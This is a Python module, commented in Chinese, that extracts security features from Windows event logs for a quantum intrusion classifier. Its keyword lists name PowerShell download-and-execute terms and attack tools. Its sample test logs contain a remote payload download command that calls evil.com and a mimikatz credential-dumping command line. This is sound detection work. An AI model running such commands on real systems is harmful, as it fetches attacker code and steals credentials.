#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
特徵提取器 - Windows Log 特徵工程模組

將原始 Windows Log 轉換為標準化的特徵向量，用於量子分類器

特徵列表 (6 個特徵對應 6 個 qubits):
1. failed_login_rate: 失敗登入頻率 (標準化)
2. suspicious_process_score: 異常程序啟動分數 (標準化)
3. powershell_risk_index: PowerShell 可疑指令指數
4. network_anomaly_rate: 網路連線異常率
5. system_file_modification_count: 系統檔案修改次數 (標準化)
6. event_log_cleared: Event Log 清除事件 (Binary: 0 or 1)
"""

import numpy as np
from typing import Dict, List, Optional
import json
import sys
from datetime import datetime, timedelta

# Windows UTF-8 兼容性
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')


class WindowsLogFeatureExtractor:
    """Windows Log 特徵提取器"""
    
    def __init__(self, feature_dim: int = 6):
        """
        初始化特徵提取器
        
        Args:
            feature_dim: 特徵維度 (預設 6，對應 7-qubit 電路)
        """
        self.feature_dim = feature_dim
        
        # 正規化參數 (基於經驗值設定)
        self.normalization_params = {
            'failed_login_max': 50.0,  # 1小時內失敗登入次數上限
            'suspicious_process_max': 20.0,  # 可疑程序啟動次數上限
            'powershell_risk_max': 10.0,  # PowerShell 風險指令次數上限
            'network_anomaly_max': 100.0,  # 異常網路連線次數上限
            'file_modification_max': 30.0  # 系統檔案修改次數上限
        }
        
        # 可疑 PowerShell 指令關鍵字
        self.powershell_risk_keywords = [
            'IEX', 'Invoke-Expression', 'DownloadString', 'DownloadFile',
            'EncodedCommand', 'Hidden', 'Bypass', 'WebClient', 'Net.WebClient',
            'Start-Process', 'WScript.Shell', 'Invoke-Command', 'Invoke-WebRequest'
        ]
        
        # 可疑程序名稱
        self.suspicious_processes = [
            'mimikatz', 'psexec', 'procdump', 'netcat', 'nc.exe',
            'cmd.exe', 'powershell.exe', 'wscript.exe', 'cscript.exe',
            'certutil.exe', 'bitsadmin.exe', 'reg.exe', 'regsvr32.exe'
        ]
        
        print(f"[FeatureExtractor] 初始化完成 (特徵維度: {feature_dim})")
    
    def normalize(self, value: float, max_value: float) -> float:
        """
        正規化數值到 [0, 1] 區間
        
        Args:
            value: 原始數值
            max_value: 最大值上限
            
        Returns:
            正規化後的數值 (0~1)
        """
        return min(value / max_value, 1.0) if max_value > 0 else 0.0
    
    def extract_failed_login_rate(self, logs: List[Dict]) -> float:
        """
        特徵 1: 計算失敗登入頻率
        
        檢查 Event ID: 4625 (登入失敗)
        """
        failed_logins = 0
        for log in logs:
            if log.get('event_id') == 4625 or log.get('EventID') == 4625:
                failed_logins += 1
        
        return self.normalize(failed_logins, self.normalization_params['failed_login_max'])
    
    def extract_suspicious_process_score(self, logs: List[Dict]) -> float:
        """
        特徵 2: 計算可疑程序啟動分數
        
        檢查 Event ID: 4688 (程序建立)
        """
        suspicious_count = 0
        for log in logs:
            if log.get('event_id') == 4688 or log.get('EventID') == 4688:
                process_name = log.get('process_name', '').lower()
                command_line = log.get('command_line', '').lower()
                
                # 檢查是否為可疑程序
                for sus_proc in self.suspicious_processes:
                    if sus_proc.lower() in process_name or sus_proc.lower() in command_line:
                        suspicious_count += 1
                        break
        
        return self.normalize(suspicious_count, self.normalization_params['suspicious_process_max'])
    
    def extract_powershell_risk_index(self, logs: List[Dict]) -> float:
        """
        特徵 3: 計算 PowerShell 風險指數
        
        檢查 Event ID: 4104 (PowerShell 腳本執行)
        """
        risk_count = 0
        for log in logs:
            if log.get('event_id') in [4104, 4103] or log.get('EventID') in [4104, 4103]:
                script_block = log.get('script_block', '').lower()
                command = log.get('command', '').lower()
                
                # 檢查風險關鍵字
                for keyword in self.powershell_risk_keywords:
                    if keyword.lower() in script_block or keyword.lower() in command:
                        risk_count += 1
                        break
        
        return self.normalize(risk_count, self.normalization_params['powershell_risk_max'])
    
    def extract_network_anomaly_rate(self, logs: List[Dict]) -> float:
        """
        特徵 4: 計算網路連線異常率
        
        檢查 Event ID: 5156 (網路連線)
        檢測異常 IP、異常 Port
        """
        anomaly_count = 0
        suspicious_ports = [4444, 5555, 6666, 7777, 8888, 31337, 12345]  # 常見後門 port
        
        for log in logs:
            if log.get('event_id') == 5156 or log.get('EventID') == 5156:
                dest_ip = log.get('dest_ip', '')
                dest_port = log.get('dest_port', 0)
                
                # 檢查可疑 port
                if dest_port in suspicious_ports:
                    anomaly_count += 1
                    continue
                
                # 檢查是否連線到內網以外的罕見 IP (簡化判斷)
                if not dest_ip.startswith(('10.', '172.16.', '192.168.', '127.')):
                    # 外部連線計數
                    anomaly_count += 0.5
        
        return self.normalize(anomaly_count, self.normalization_params['network_anomaly_max'])
    
    def extract_system_file_modification_count(self, logs: List[Dict]) -> float:
        """
        特徵 5: 計算系統檔案修改次數
        
        檢查 Event ID: 4663 (檔案系統存取)
        """
        modification_count = 0
        system_paths = ['\\windows\\system32\\', '\\windows\\', 'c:\\windows\\']
        
        for log in logs:
            if log.get('event_id') == 4663 or log.get('EventID') == 4663:
                file_path = log.get('file_path', '').lower()
                access_mask = log.get('access_mask', '')
                
                # 檢查是否為系統目錄且為寫入操作
                if any(sys_path in file_path for sys_path in system_paths):
                    if 'write' in access_mask.lower() or 'delete' in access_mask.lower():
                        modification_count += 1
        
        return self.normalize(modification_count, self.normalization_params['file_modification_max'])
    
    def extract_event_log_cleared(self, logs: List[Dict]) -> float:
        """
        特徵 6: 檢測 Event Log 清除事件 (Binary)
        
        檢查 Event ID: 1102 (安全日誌被清除)
        """
        for log in logs:
            if log.get('event_id') == 1102 or log.get('EventID') == 1102:
                return 1.0  # 高風險！
        return 0.0
    
    def extract_features(self, logs: List[Dict]) -> np.ndarray:
        """
        從 Windows Logs 提取完整的特徵向量
        
        Args:
            logs: Windows Log 列表 (JSON 格式)
            
        Returns:
            np.ndarray: 標準化的特徵向量 (shape: [feature_dim,])
        """
        if not logs:
            print("[WARNING] 日誌為空，返回零向量")
            return np.zeros(self.feature_dim)
        
        features = []
        
        # 提取各項特徵
        features.append(self.extract_failed_login_rate(logs))
        features.append(self.extract_suspicious_process_score(logs))
        features.append(self.extract_powershell_risk_index(logs))
        features.append(self.extract_network_anomaly_rate(logs))
        features.append(self.extract_system_file_modification_count(logs))
        features.append(self.extract_event_log_cleared(logs))
        
        # 轉換為 numpy array
        feature_vector = np.array(features)
        
        # 確保維度正確
        if len(feature_vector) < self.feature_dim:
            feature_vector = np.pad(feature_vector, (0, self.feature_dim - len(feature_vector)))
        elif len(feature_vector) > self.feature_dim:
            feature_vector = feature_vector[:self.feature_dim]
        
        return feature_vector
    
    def extract_from_json_file(self, json_file: str) -> np.ndarray:
        """
        從 JSON 檔案讀取日誌並提取特徵
        
        Args:
            json_file: JSON 檔案路徑
            
        Returns:
            np.ndarray: 特徵向量
        """
        try:
            with open(json_file, 'r', encoding='utf-8') as f:
                logs = json.load(f)
            
            # 支援單一日誌物件或日誌列表
            if isinstance(logs, dict):
                logs = [logs]
            
            return self.extract_features(logs)
        except Exception as e:
            print(f"[ERROR] 讀取檔案失敗: {e}")
            return np.zeros(self.feature_dim)


def generate_sample_logs() -> List[Dict]:
    """
    生成範例日誌供測試使用
    
    Returns:
        List[Dict]: 範例日誌列表
    """
    sample_logs = [
        # 正常日誌
        {
            'event_id': 4624,
            'timestamp': '2025-10-15 10:30:00',
            'user': 'SYSTEM',
            'message': 'Successful login'
        },
        # 失敗登入
        {
            'event_id': 4625,
            'timestamp': '2025-10-15 10:31:00',
            'user': 'admin',
            'source_ip': '192.168.1.100',
            'message': 'Failed login attempt'
        },
        # 可疑 PowerShell
        {
            'event_id': 4104,
            'timestamp': '2025-10-15 10:32:00',
            'script_block': 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")',
            'user': 'user1'
        },
        # 可疑程序
        {
            'event_id': 4688,
            'timestamp': '2025-10-15 10:33:00',
            'process_name': 'mimikatz.exe',
            'command_line': 'mimikatz.exe privilege::debug sekurlsa::logonpasswords',
            'user': 'admin'
        },
        # Event Log 清除 (高風險!)
        {
            'event_id': 1102,
            'timestamp': '2025-10-15 10:34:00',
            'user': 'admin',
            'message': 'Security log was cleared'
        }
    ]
    
    return sample_logs


def main():
    """測試特徵提取器"""
    print("="*70)
    print("  Windows Log 特徵提取器測試")
    print("="*70)
    
    # 初始化提取器
    extractor = WindowsLogFeatureExtractor(feature_dim=6)
    
    # 生成範例日誌
    print("\n[測試] 使用範例日誌...")
    sample_logs = generate_sample_logs()
    print(f"[OK] 已生成 {len(sample_logs)} 筆範例日誌")
    
    # 提取特徵
    print("\n[測試] 提取特徵向量...")
    features = extractor.extract_features(sample_logs)
    
    print("\n特徵向量結果:")
    print("-"*70)
    print(f"1. 失敗登入頻率:          {features[0]:.3f}")
    print(f"2. 可疑程序分數:          {features[1]:.3f}")
    print(f"3. PowerShell 風險指數:   {features[2]:.3f}")
    print(f"4. 網路異常率:            {features[3]:.3f}")
    print(f"5. 系統檔案修改次數:      {features[4]:.3f}")
    print(f"6. Event Log 清除:        {features[5]:.3f}")
    print("-"*70)
    print(f"\n完整特徵向量: {features}")
    print(f"向量維度: {features.shape}")
    
    # 風險評估
    risk_score = np.mean(features)
    print(f"\n整體風險分數: {risk_score:.3f}")
    if risk_score > 0.6:
        print("[WARNING] ⚠️  高風險日誌！建議立即檢查")
    elif risk_score > 0.3:
        print("[INFO] ⚡ 中等風險，建議持續監控")
    else:
        print("[OK] ✅ 風險較低")
    
    print("\n" + "="*70)


if __name__ == "__main__":
    main()

